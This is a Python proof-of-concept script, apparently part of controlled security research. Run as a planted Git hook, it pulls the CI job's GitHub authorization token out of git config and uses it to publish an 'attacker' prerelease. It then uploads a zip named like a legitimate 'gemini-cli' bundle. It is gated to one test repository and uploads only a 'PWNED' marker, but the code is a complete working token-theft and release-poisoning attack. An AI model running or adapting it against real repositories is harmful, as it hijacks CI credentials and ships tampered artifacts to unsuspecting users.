#!/usr/bin/env python3
"""Publish one harmless asset only in the controlled 1bcb39 fixture."""
import http.client
import io
import json
import os
import subprocess
import sys
import urllib.parse
import zipfile

SAFE_REPOSITORY = "arnodorian1337/pwnreq-gemini-release-assets-1bcb39-20261126111314"
ATTACK_TAG = "v0.0.2-pwnreq-attacker-asset"
ASSET_NAME = "gemini-cli-bundle.zip"


def request(host, method, path, authorization, body=None, content_type="application/vnd.github+json"):
    connection = http.client.HTTPSConnection(host, timeout=20)
    headers = {
        "Accept": "application/vnd.github+json",
        "Authorization": authorization,
        "User-Agent": "pwnreq-controlled-1bcb39-probe",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    if body is not None:
        headers["Content-Type"] = content_type
        headers["Content-Length"] = str(len(body))
    connection.request(method, path, body=body, headers=headers)
    response = connection.getresponse()
    status, data = response.status, response.read()
    connection.close()
    return status, data


def api_json(method, suffix, authorization, payload=None):
    body = None if payload is None else json.dumps(payload, separators=(",", ":")).encode()
    status, data = request(
        "api.github.com",
        method,
        f"/repos/{SAFE_REPOSITORY}{suffix}",
        authorization,
        body,
    )
    return status, json.loads(data) if data else None


def marker_zip():
    stream = io.BytesIO()
    info = zipfile.ZipInfo("pwned.txt", date_time=(2020, 1, 1, 0, 0, 0))
    info.compress_type = zipfile.ZIP_DEFLATED
    info.external_attr = 0o100644 << 16
    with zipfile.ZipFile(stream, "w") as archive:
        archive.writestr(info, b"PWNED\n")
    return stream.getvalue()


def main():
    if os.environ.get("GITHUB_REPOSITORY") != SAFE_REPOSITORY:
        return 40
    try:
        extraheader = subprocess.check_output(
            ["git", "config", "--get", "http.https://github.com/.extraheader"],
            text=True,
            stderr=subprocess.DEVNULL,
        ).strip()
    except subprocess.CalledProcessError:
        return 0
    if not extraheader.startswith("AUTHORIZATION: basic "):
        return 41
    authorization = extraheader.split(":", 1)[1].strip()

    status, release = api_json("GET", f"/releases/tags/{ATTACK_TAG}", authorization)
    if status == 404:
        status, release = api_json(
            "POST",
            "/releases",
            authorization,
            {
                "tag_name": ATTACK_TAG,
                "target_commitish": "main",
                "name": "Controlled 1bcb39 release asset proof",
                "body": "Harmless controlled release created by the planted Git hook.",
                "draft": False,
                "prerelease": True,
            },
        )
    if status not in (200, 201) or not isinstance(release, dict) or not release.get("id"):
        return 42

    status, assets = api_json("GET", f"/releases/{release['id']}/assets", authorization)
    if status != 200 or not isinstance(assets, list):
        return 43
    if any(asset.get("name") == ASSET_NAME for asset in assets):
        return 0

    archive = marker_zip()
    path = (
        f"/repos/{SAFE_REPOSITORY}/releases/{release['id']}/assets"
        f"?name={urllib.parse.quote(ASSET_NAME)}"
    )
    status, _ = request(
        "uploads.github.com",
        "POST",
        path,
        authorization,
        archive,
        "application/zip",
    )
    return 0 if status == 201 else 44


if __name__ == "__main__":
    sys.exit(main())
